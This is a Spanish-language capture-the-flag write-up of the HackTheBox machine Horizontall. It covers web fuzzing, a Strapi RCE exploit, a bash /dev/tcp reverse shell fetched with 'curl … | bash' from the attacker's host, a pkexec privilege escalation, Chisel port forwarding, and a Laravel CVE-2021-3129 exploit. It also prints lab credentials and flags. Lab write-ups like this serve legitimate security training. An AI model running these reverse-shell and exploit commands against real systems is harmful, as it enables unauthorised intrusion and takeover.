---
layout: default
---
![image](../../Imágenes%20Máquinas/HORIZONTALL.png)


# HORIZONTALL [HACKTHEBOX]
### (Web fuzzing, Strapi RCE exploitation, mySQL, pkexec privilege escalation, Chisel port forwarding, Laravel Root RCE exploitation)

#### - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


En primer lugar haremos un escaneo de puertos con nmap:

```bash
nmap -p- --open -sS -sCV -T5 10.10.11.105 -vvv -n -Pn escaneo_nmap
```

Nos salen 3 puertos abiertos:

![image](../zimages/Pasted%20image%2020241105155724.png)

Si hacemos un whatweb de la ip víctima, nos da un código '301', pero también nos da un dominio que lo pondremos en el archivo "/etc/hosts":

![image](../zimages/Pasted%20image%2020241105155704.png)


# Fuzzing

Ahora si nos metemos en la web encontramos poca cosa, un panel donde te deja poner un email y una reseña, pero el botón de "Send" no funciona, vamos a hacer fuzzing web con wfuzz:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://horizontall.htb/FUZZ --oF fuzzing
```

- _El parámetro `--oF` sirve para exportar el escaneo a un archivo__

Esto es lo que nos encuentra:

![image](../zimages/Pasted%20image%2020241105161127.png)

Como no encuentra nada de valor, vamos a probar a escanear por subdominios:

```bash
wfuzz -c --hh=194 -t 200 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" -u http://horizontall.htb -f subdomains_wfuzz
```

Y nos encuentra el siguiente:

![image](../zimages/Pasted%20image%2020241105163944.png)

Metemos el subdominio en "/etc/hosts" y nos metemos en la web, pero solo nos aparece el mensaje de "Welcome", así que volvemos a hacer fuzzing de directorios en esa url ('http://api-prod.horizontall.htb/'):

```bash
wfuzz -c --hc=404 -t 200 -2 /usr/share/wordlists/SecLists/Discovery/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb -f fuzzing_api-prod
```

Nos saca los siguientes subdirectorios:

![image](../zimages/Pasted%20image%2020241105170712.png)

Si nos vamos a '/admin', nos encontramos con un panel de login con el nombre de Strapi, que si buscamos este nombre por internet, nos sale que es un CMS (gestor de contenido) basado en Node. Si probamos a loguearnos con las credenciales por defecto (admin:admin), no nos deja. 
Vamos a hacer fuzzing del directorio '/admin' ya que, cuando entramos, nos redirige automáticamente a '/auth/login':

```bash
wfuzz -c --hh=854 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/admin/FUZZ -f "fuzzing_AdminPanel"
```

Esto es lo que nos encuentra:

![image](../zimages/Pasted%20image%2020241105171532.png)


# Strapi Exploitation

Después de fijarse en todos los directorios, el que se llama '/init' nos da una pista, vamos a hacerle un curl para verlo mejor:

```bash
curl http://api-prod.horizontall.htb/admin/init | jq
```

Nos da la siguiente versión de "Strapi":

![image](../zimages/Pasted%20image%2020241105171742.png)

Vamos a buscar esa versión con el siguiente comando 

```bash
searchsploit Strapi 3.0.0-beta.17.4
```

Nos da una vulnerabilidad de RCE (Remote Code Execution), la descargamos:

![image](../zimages/Pasted%20image%2020241105171958.png)

Si ejecutamos el exploit, vemos que nos da un token de usuario, es decir, que se ha ejecutado correctamente y tenemos ejecución remota de comandos, el problema es que no nos muestra ningún output:

![image](../zimages/Pasted%20image%2020241105172211.png)

Vamos a probar a hacernos un ping a nuestra máquina atacante a ver si nos ejecuta los comandos. Lo primero es activar tcpdump para ver el ping:

```bash
tcpdump -i tun0 icmp -n
```

- Explicación:
	1. Parámetro '-i': Sirve para especificar la interfaz de red que vamos a analizar.
	2. Parámetro 'icmp': Le especificamos que queremos que nos muestre únicamente trazas icmp, es decir, el tipo de trazas que lanza el ping.
	3. Parámetro '-n': Especifica que no queremos que nos haga resolución DNS, esto nos muestra la ip de la víctima (10.10.11.105) en vez de su dominio (horizontall.htb)

Esto es lo que recibimos:

![image](../zimages/Pasted%20image%2020241105172827.png)

Quiere decir que tenemos RCE, vamos a intentar conseguir una reverse shell. Para no liarla mucho, vamos a crearnos un archivo .html con el siguiente código:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.17/443 0>&1
```

Esto nos permitirá conseguir una reverse shell con el típico comando de bash. Ahora vamos a ponernos en escucha con `nc-nlvp 443` y vamos a crear un server en python para compartir la shell reversa (`python3 -m http.server 80`). Por último pondremos el siguiente comando en el RCE del exploit:

```bash
curl 10.10.14.17 | bash
```

Le decimos que nos haga un curl a nuestra ip y, como es un archivo index.html, leerá directamente el código, después lo pipeamos con bash para que lo interprete directamente con bash, de esta manera, recibimos nuestra shell:

![image](../zimages/Pasted%20image%2020241105173351.png)

De esta manera ya tenemos la flag de user (`39a1ef07f9adbf92023ce6010e816733`):

![image](../zimages/Pasted%20image%2020241105173445.png)


# Privilege escalation (Option pkexec)

Ahora tenemos que ampliar privilegios, así que vamos a mirar si tenemos alguna opción listando binarios SUID con el comando `find / -perm -4000 2>/dev/null`:

![image](../zimages/Pasted%20image%2020241105175307.png)

Vemos el pkexec, vamos a ver quien es el owner:

![image](../zimages/Pasted%20image%2020241105175341.png)

Es root, vamos a probar a descargarnos en nuestra máquina atacante el script de python para explotar esto. En mi caso lo descargué de este repositorio (https://github.com/Almorabea/pkexec-exploit). Vamos a clonarlo con `git clone [url]`, lo compartimos con la máquina víctima y lo ejecutamos con python3:

![image](../zimages/Pasted%20image%2020241105175958.png)

Ya somos root :)


# Privilege escalation (Exploration + Port Forwarding with Chisel)

Ahora tenemos que ampliar privilegios, vamos a explorar en el directorio home de strapi ('/opt/strapi'). Si exploramos un poco, vemos que en el directorio '/opt/strapi/myapi/config/environments/development', hay un archivo "database.json", si lo leemos vemos la siguiente información:

![image](../zimages/Pasted%20image%2020241105173807.png)

Vamos a internar entrar en mysql con estas credenciales:

```bash
mysql -udeveloper -p'#J!:F9Zt2u'
```

Si exploramos un poco en mysql, vemos que en la tabla strapi_administrator de la base de datos Strapi, nos da unas credenciales de admin:

![image](../zimages/Pasted%20image%2020241105174457.png)

Pero si las intentamos crackear, no nos muestra nada. Vamos a buscar por puertos abiertos dentro de la máquina:

```bash
netstat -nat
```

Nos aparecen los puertos que vimos antes con el escaneo de nmap (22,80), pero también nos aparecen 2 más, el 1337, que no nos interesa y el 8000, que si le hacemos un curl nos muestra que está corriendo Laravel por http:

![image](../zimages/Pasted%20image%2020241105180325.png)

Vamos a hacer un port forwarding para poder ver la web en nuestra máquina.
Para ello nos descargaremos chisel desde el repoo de github oficial (https://github.com/jpillora/chisel)

 >_en mi caso no me funcionó porque mi máquina tiene las librerías actualizadas a una versión mayor a la máquina víctima, así que tuve que hacer un docker y compilar el programa ahí, os dejo el link del binario compilado en la versión correcta por si tenéis el mismo problema._

![link](https://mega.nz/file/d2hmSSSC#gU8_jdS9bcs0oNyKSY0qVNsVMXkLYRrWTrbeEODaWqM)




A continuación lo compilamos, se puede hacer de 2 maneras:

### Manera 1

Se puede compilar directamente con el comando `go build .` y listo, el problema es que así nos va a ocupar mucho (14Mb):

![image](../zimages/Pasted%20image%2020241104233110.png)

### Manera 2

Para que ocupe mucho menos espacio vamos a ejecutar 2 comandos, el primero sería `go build -ldflags ("-s -w")`, esto directamente nos pasa a ocupar 9.1Mb. A continuación usaremos el comando `upx chisel` para reducirlo aún más y que se nos quede en 3.6Mb, de esta manera es mucho más rápido el hecho de compartirlo con la máquina víctima.

Después de compartirlo en la máquina víctima, vamos a ejecutar el siguiente comando en nuestra máquina atacante:

```bash
./chisel server --reverse -p 1234
```

- Explicación:
	1. Comando `server`: con esto especificas que quieres montar un servidor en tu máquina atacante para poder traerte un puerto de la víctima.
	2. Parámetro `--reverse`: Sirve para decirle a chisel que vas a hacer un reverse port forwarding.
	3. Parámetro `-p`: aquí especificas el puerto que vas a utilizar para montar el servidor, vale cualquiera.

Nos sale esto:

![image](../zimages/Pasted%20image%2020241105182116.png)

A continuación ejecutamos lo siguiente en la máquina víctima, tras darle al ejecutable de chisel permisos de ejecución con `chmod +x chisel`:

```bash
./chisel client 10.10.14.17:1234 R:8000:127.0.0.1:8000
```

- Explicación:
	1. Comando `client`:  Especificas a chisel que esta máquina es el cliente, es decir, la máquina víctima.
	2. Parámetro 1 | `'10.10.14.17:1234'`: Es la ip + el puerto especificado anteriormente del servidor.
	3. Parámetro 2 | `R:8000:127.0.0.1:8000`: Aquí le especificamos la ruta a seguir para hacer el port forwarding, es decir, primero le especificamos con `8000` el puerto que nuestra máquina atacante va a estar utilizando; segundo, le especificamos el localhost, es decir, la máquina víctima; por último le especificamos el puerto que vamos a clonar de la máquina víctima, el `8000`.

Nos saldrá esto:

![image](../zimages/Pasted%20image%2020241105182408.png)

Y en nuestra máquina atacante nos saldrá un aviso:

![image](../zimages/Pasted%20image%2020241105182439.png)

De esta manera ya podemos acceder a la web del puerto 8000 mediante nuestro navegador, poniendo `localhost:8000`:

![image](../zimages/Pasted%20image%2020241105182603.png)

Aquí también nos muestra la versión de Laravel, vamos a buscarla por internet para ver si hay algún exploit en github, en mi caso me funcionó este repositorio (https://github.com/nth347/CVE-2021-3129_exploit), nos lo clonamos y lo ejecutamos siguiendo las instrucciones del exploit:

```bash
python3 exploit.py http://localhost:8000 Monolog/RCE1 id
```

Si nos fijamos en el output vemos que tenemos RCE como root:

![image](../zimages/Pasted%20image%2020241105182906.png)

Ahora vamos a seguir el mismo procedimiento de antes para conseguir una reverse shell. Nos montamos un server en python en el directorio donde tengamos el archivo index.html con la reverse shell y nos ponemos en escucha con netcat, a continuación, ejecutamos el comando `curl http://10.10.14.17 | bash` en el exploit (siguiendo las instrucciones), si ponemos un `whoami`, ya somos root :)

![image](../zimages/Pasted%20image%2020241105183351.png)

Ahora nos vamos al directorio de '/root' y leemos la flag de root (`fcd5d89e5d7ea86ce34131624ff2d851`):

![image](../zimages/Pasted%20image%2020241105184541.png)

![image](../zimages/Pasted%20image%2020241105183451.png)

# ./ROOTED

